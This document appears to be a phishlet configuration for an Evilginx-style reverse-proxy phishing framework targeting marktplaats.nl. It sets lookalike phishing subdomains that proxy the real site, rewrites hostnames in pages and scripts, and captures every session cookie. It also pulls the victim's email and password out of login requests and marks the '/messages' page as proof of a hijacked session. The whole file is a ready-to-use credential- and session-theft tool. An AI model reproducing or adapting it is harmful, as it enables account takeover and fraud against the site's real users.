author: '@charlesbel'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: 'mijn', orig_sub: 'www', domain: 'marktplaats.nl', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'marktplaats.nl', session: false, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'www.marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.marktplaats.nl', orig_sub: 'www', domain: 'marktplaats.nl', search: 'application/json;charset=utf-8', replace: 'application/json', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}

auth_tokens:
  - domain: 'www.marktplaats.nl'
    keys: ['.*,regexp']
  - domain: '.marktplaats.nl'
    keys: ['.*,regexp']
auth_urls:
  - '/messages'

credentials:
  username:
    key: ''
    search: '"email":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '"password":"([^"]*)"'
    type: 'json'

login:
  domain: 'www.marktplaats.nl'
  path: '/account/login.html?target=%2Fmessages'
